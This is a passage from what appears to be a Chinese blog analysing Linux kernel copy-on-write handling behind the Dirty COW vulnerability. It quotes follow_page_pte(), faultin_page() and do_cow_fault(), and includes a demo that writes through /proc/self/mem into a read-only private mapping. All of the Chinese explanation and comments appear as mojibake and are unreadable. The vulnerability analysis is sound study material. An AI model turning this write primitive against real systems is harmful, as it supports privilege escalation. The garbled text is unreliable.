class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//æ ¹æ®flagsæ ‡å¿—è·Ÿè¸ªé¡µé¢çš„pte</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dev_pagemap</span> *<span class="hljs-title">pgmap</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-type">pte_t</span> *ptep, pte;<br><br>retry:<br><span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>pte = *ptep;<br><span class="hljs-keyword">if</span> (!pte_present(pte)) &#123;<br><span class="hljs-type">swp_entry_t</span> entry;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * KSM&#x27;s break_ksm() relies upon recognizing a ksm page</span><br><span class="hljs-comment"> * even while it is being migrated, so for that case we</span><br><span class="hljs-comment"> * need migration_entry_wait().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely(!(flags &amp; FOLL_MIGRATION)))<br><span class="hljs-keyword">goto</span> no_page;<br><span class="hljs-keyword">if</span> (pte_none(pte))<br><span class="hljs-keyword">goto</span> no_page;<br>entry = pte_to_swp_entry(pte);<br><span class="hljs-keyword">if</span> (!is_migration_entry(entry))<br><span class="hljs-keyword">goto</span> no_page;<br>pte_unmap_unlock(ptep, ptl);<br>migration_entry_wait(mm, pmd, address);<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))<br><span class="hljs-keyword">goto</span> no_page;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//å¦‚æœè¦æ±‚å†™å…¥ï¼Œä½†æ˜¯pteè¡¨ç¤ºä¸å¯å†™å…¥</span><br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>page = vm_normal_page(vma, address, pte);<span class="hljs-comment">//æ ¹æ®è¿™ä¸ªpteæ‰¾åˆ°å¯¹åº”çš„æ™®é€šé¡µæè¿°ç¬¦</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    æ‰¾åˆ°é¡µæè¿°ç¬¦å, ä¼šæ ¹æ®flagsè¿›è¡Œä¸€äº›æ“ä½œ, ç„¶åè¿”å›page, åœ¨è¿™é‡Œflags = 0x2017, ä¹Ÿå°±æ˜¯å¦‚ä¸‹æ ‡å¿—</span><br><span class="hljs-comment">FOLL_WRITE 0x01 : éœ€è¦è¿›è¡Œå†™å…¥</span><br><span class="hljs-comment">FOLL_TOUCH 0x02 : æ ‡è®°ä¸€ä¸‹é¡µé¢è¢«è®¿é—®è¿‡</span><br><span class="hljs-comment">FOLL_GET 0x04 : è·å–é¡µé¢çš„å¼•ç”¨, ä»è€Œè®©é¡µé¢é”å®šåœ¨å†…å­˜ä¸­</span><br><span class="hljs-comment">FOLL_FORCE 0x10 : å¼ºåˆ¶å†™å…¥åªè¯»å†…å­˜åŒº</span><br><span class="hljs-comment">FOLL_REMOTE 0x2000 : è¦è®¿é—®çš„ä¸æ˜¯å½“å‰ä»»åŠ¡çš„å†…å­˜ç©ºé—´</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!page &amp;&amp; pte_devmap(pte) &amp;&amp; (flags &amp; FOLL_GET)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Only return device mapping pages in the FOLL_GET case since</span><br><span class="hljs-comment"> * they are only valid while holding the pgmap reference.</span><br><span class="hljs-comment"> */</span><br>pgmap = get_dev_pagemap(pte_pfn(pte), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (pgmap)<br>page = pte_page(pte);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">goto</span> no_page;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_DUMP) &#123;<br><span class="hljs-comment">/* Avoid special (like zero) pages in core dumps */</span><br>page = ERR_PTR(-EFAULT);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-keyword">if</span> (is_zero_pfn(pte_pfn(pte))) &#123;<br>page = pte_page(pte);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = follow_pfn_pte(vma, address, ptep, flags);<br>page = ERR_PTR(ret);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT &amp;&amp; PageTransCompound(page)) &#123;<br><span class="hljs-type">int</span> ret;<br>get_page(page);<br>pte_unmap_unlock(ptep, ptl);<br>lock_page(page);<br>ret = split_huge_page(page);<br>unlock_page(page);<br>put_page(page);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-keyword">if</span> (flags &amp; FOLL_GET) &#123;<span class="hljs-comment">//å¦‚æœè®¾ç½®äº†GETæ ‡å¿—ï¼Œåˆ™ä¼šè·å–ä¸€ä¸ªé¡µé¢çš„å¼•ç”¨ï¼Œé˜²æ­¢é¡µé¢ä»å†…å­˜ä¸­è¢«æ¢å‡º</span><br>get_page(page);<br><br><span class="hljs-comment">/* drop the pgmap reference now that we hold the page */</span><br><span class="hljs-keyword">if</span> (pgmap) &#123;<br>put_dev_pagemap(pgmap);<br>pgmap = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_TOUCH) &#123;<span class="hljs-comment">//æ ‡è®°ä¸‹è¿™ä¸ªé¡µè¢«è®¿é—®è¿‡</span><br>        <span class="hljs-comment">//å¦‚æœè¦å†™å…¥ï¼Œä½†æ˜¯é¡µé¢ä¹Ÿåœ¨ä¸æ˜¯è„çš„è¯ï¼Œå°±è®¾ç½®ä¸ºè„é¡µ</span><br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp;<br>    !pte_dirty(pte) &amp;&amp; !PageDirty(page))<br>set_page_dirty(page);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * pte_mkyoung() would be more correct here, but atomic care</span><br><span class="hljs-comment"> * is needed to avoid losing the dirty bit: it is easier to use</span><br><span class="hljs-comment"> * mark_page_accessed().</span><br><span class="hljs-comment"> */</span><br>       <span class="hljs-comment">//æ ‡è®°</span><br>mark_page_accessed(page);<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_MLOCK) &amp;&amp; (vma-&gt;vm_flags &amp; VM_LOCKED)) &#123;<br><span class="hljs-comment">/* Do not mlock pte-mapped THP */</span><br><span class="hljs-keyword">if</span> (PageTransCompound(page))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The preliminary mapping check is mainly to avoid the</span><br><span class="hljs-comment"> * pointless overhead of lock_page on the ZERO_PAGE</span><br><span class="hljs-comment"> * which might bounce very badly if there is contention.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If the page is already locked, we don&#x27;t need to</span><br><span class="hljs-comment"> * handle it now - vmscan will handle it later if and</span><br><span class="hljs-comment"> * when it attempts to reclaim the page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page-&gt;mapping &amp;&amp; trylock_page(page)) &#123;<br>lru_add_drain();  <span class="hljs-comment">/* push cached pages to LRU */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Because we lock page here, and migration is</span><br><span class="hljs-comment"> * blocked by the pte&#x27;s page reference, and we</span><br><span class="hljs-comment"> * know the page is still mapped, we don&#x27;t even</span><br><span class="hljs-comment"> * need to check for file-cache page truncation.</span><br><span class="hljs-comment"> */</span><br>mlock_vma_page(page);<br>unlock_page(page);<br>&#125;<br>&#125;<br>out:<br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> page;<br>no_page:<br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">if</span> (!pte_none(pte))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page()"></a>faultin_page()</h4><p><code>faultin_page()</code>ä¼šæŠŠ<code>flags</code>ä¸­çš„<code>FOLL</code>_æ ‡å¿—è½¬ä¸º<code>handle_mm_fault()</code>ä½¿ç”¨çš„<code>FAULT_</code>æ ‡å¿—, ç„¶åè°ƒç”¨<code>handle_mm_fault()</code>å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mmap_sem must be held on entry.  If @nonblocking != NULL and</span><br><span class="hljs-comment"> * *@flags does not include FOLL_NOWAIT, the mmap_sem may be released.</span><br><span class="hljs-comment"> * If it is, *@nonblocking will be set to 0 and -EBUSY returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">/* mlock all present pages, but do not fault in new pages */</span><br><span class="hljs-keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-comment">/* For mm_populate(), just skip the stack guard page. */</span><br><span class="hljs-keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;<br>(stack_guard_page_start(vma, address) ||<br> stack_guard_page_end(vma, address + PAGE_SIZE)))<br><span class="hljs-keyword">return</span> -ENOENT;<br>    <br>    <span class="hljs-comment">//æ ¹æ®FOLL_æ ‡ç€è®¾ç½®FAULT_FLAGæ ‡å¿—</span><br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE)<br>fault_flags |= FAULT_FLAG_WRITE;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_REMOTE)<br>fault_flags |= FAULT_FLAG_REMOTE;<br><span class="hljs-keyword">if</span> (nonblocking)<br>fault_flags |= FAULT_FLAG_ALLOW_RETRY;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_NOWAIT)<br>fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;<br>VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);<br>fault_flags |= FAULT_FLAG_TRIED;<br>&#125;<br><span class="hljs-comment">//å¤„ç†ç¼ºé¡µå¼‚å¸¸</span><br>ret = handle_mm_fault(vma, address, fault_flags);<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_OOM)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))<br><span class="hljs-keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;<br><span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))<br><span class="hljs-keyword">return</span> -EFAULT;<br>BUG();<br>&#125;<br><br><span class="hljs-keyword">if</span> (tsk) &#123;<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_MAJOR)<br>tsk-&gt;maj_flt++;<br><span class="hljs-keyword">else</span><br>tsk-&gt;min_flt++;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;<br><span class="hljs-keyword">if</span> (nonblocking)<br>*nonblocking = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> -EBUSY;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment"> * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment"> * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment"> * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment"> * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment"> * reCOWed by userspace write).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>*flags &amp;= ~FOLL_WRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å¤§è‡´çš„æµç¨‹"><a href="#å¤§è‡´çš„æµç¨‹" class="headerlink" title="å¤§è‡´çš„æµç¨‹"></a>å¤§è‡´çš„æµç¨‹</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">mem_write</span>()<br><span class="hljs-built_in">mem_rw</span>()<br><span class="hljs-built_in">__access_remote_vm</span>()<br><span class="hljs-built_in">__get_user_pages_remote</span>()<br><span class="hljs-built_in">__get_user_pages_locked</span>()<br><span class="hljs-built_in">__get_user_pages</span>()<br><span class="hljs-built_in">follow_page_mask</span>()<br><span class="hljs-built_in">follow_page_pte</span>()<br><span class="hljs-built_in">faultin_page</span>()<br></code></pre></td></tr></table></figure><h3 id="get-user-pagesã®å¥‡å¦™æ—…é€”ğŸ¤”"><a href="#get-user-pagesã®å¥‡å¦™æ—…é€”ğŸ¤”" class="headerlink" title="__get_user_pagesã®å¥‡å¦™æ—…é€”ğŸ¤”"></a>__get_user_pagesã®å¥‡å¦™æ—…é€”ğŸ¤”</h3><h4 id="æµ‹è¯•demo"><a href="#æµ‹è¯•demo" class="headerlink" title="æµ‹è¯•demo"></a>æµ‹è¯•demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;./test&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="get-user-pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯"><a href="#get-user-pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯" class="headerlink" title="__get_user_pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯"></a>__get_user_pagesã®ç¬¬ä¸€æ¬¡å¾ªç¯</h4><p>ç”±äº<code>linux</code>çš„å†…æ ¸çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œç¬¬ä¸€æ¬¡è®¿é—®æŸä¸ªå†…å­˜é¡µä¹‹å‰<code>linux kernel</code> å¹¶ä¸ä¼šä¸ºå…¶åˆ†é…ç‰©ç†é¡µï¼Œæ‰€ä»¥è·å–ä¸åˆ°å¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œå› æ­¤ç¬¬ä¸€æ¬¡è¿›å…¥<code>follow_page_mask</code>è‡ªç„¶æ˜¯è¿”å›NULLï¼Œæ­¤æ—¶è°ƒç”¨<code>faultin_page()</code>ï¼Œè¿›å…¥<code>handle_mm_fault</code>ï¼Œå¼€å§‹ç¼ºé¡µå¼‚å¸¸å¤„ç†</p><p><code>__handle_mm_fault()</code>è´Ÿè´£åˆ†é…å„çº§é¡µè¡¨é¡¹, ç„¶åè°ƒç”¨<code>handle_pte_fault()</code></p><p><code>handle_pte_fault()</code>å‘ç°æ˜¯æ˜ å°„åˆ°æ–‡ä»¶, ä½†æ•´ä¸ª<code>PTE</code>ä¸º<code>none</code>çš„æƒ…å†µ, ä¼šè°ƒç”¨<code>do_fault()</code>å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//å¦‚æœ fe-&gt;pte ä¸ºç©ºï¼Œåˆ™è¯´æ˜é¡µé¢ä¸å­˜åœ¨ï¼Œæ ¹æ® VMAï¼ˆVirtual Memory Areaï¼‰æ˜¯å¦åŒ¿åæ‰§è¡Œä¸åŒçš„é¡µé¢å¤„ç†æ“ä½œã€‚</span><br><span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br><span class="hljs-keyword">return</span> do_anonymous_page(fe);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//åˆ†é…ç‰©ç†é¡µæ¡†</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>do_fault()</code>å‘ç°éœ€è¦å†™å…¥ç§æœ‰æ–‡ä»¶æ˜ å°„çš„å†…å­˜åŒºå°±ä¼šè°ƒç”¨<code>do_cow_fault()</code>è¿›è¡Œå†™æ—¶å¤åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//å¦‚æœè™šæ‹Ÿå†…å­˜åŒºåŸŸçš„æ ‡å¿—ä¸­ä¸åŒ…å« VM_SHARED æ ‡å¿—ï¼Œè¯´æ˜è¯¥åŒºåŸŸæ˜¯ç§æœ‰çš„ï¼Œå‡½æ•°è°ƒç”¨ do_cow_fault å‡½æ•°å¤„ç†å†™æ—¶å¤åˆ¶é”™è¯¯ï¼ˆCopy-On-Write Faultï¼‰ã€‚</span><br><span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br></code></pre></td></tr></table></figure><ul><li>é¦–å…ˆè°ƒç”¨<code>alloc_page_vma()</code>åˆ†é…ä¸€ä¸ªæ–°é¡µ</li><li>ç„¶åè°ƒç”¨<code>__do_fault()</code>éœ€è¦æ‰¾<code>address</code>å¯¹åº”çš„åŸå§‹é¡µçš„æè¿°ç¬¦</li><li>ç„¶åè°ƒç”¨<code>copy_user_highpage()</code>æŠŠåŸå§‹é¡µçš„å†…å®¹å¤åˆ¶åˆ°æ–°é¡µä¸­</li><li>æ–°æ—§é¡µéƒ½è¢«æ˜ å°„åˆ°å†…æ ¸åœ°å€ç©ºé—´ä¸­, å› æ­¤å¤åˆ¶çš„æ—¶å€™ç›´æ¥<code>memcpy()</code>å°±å¯ä»¥</li><li>æœ€åè°ƒç”¨<code>alloc_set_pte()</code>è®¾ç½®é¡µè¡¨çš„<strong>PTE</strong>, å»ºç«‹åå‘æ˜ å°„</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br> <span class="hljs-type">void</span> *fault_entry;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br> <span class="hljs-type">int</span> ret;<br><br> <span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//ä¸ºå½“å‰è¿›ç¨‹åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢</span><br> <span class="hljs-keyword">if</span> (!new_page)<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> <span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//ä¸ºæ–°é¡µé¢åˆ†é…å†…å­˜èµ„æº</span><br>    &amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>  put_page(new_page);<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br> &#125;<br><br> ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//è¯»å–æ–‡ä»¶å†…å®¹åˆ°fault_page</span><br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br><br> <span 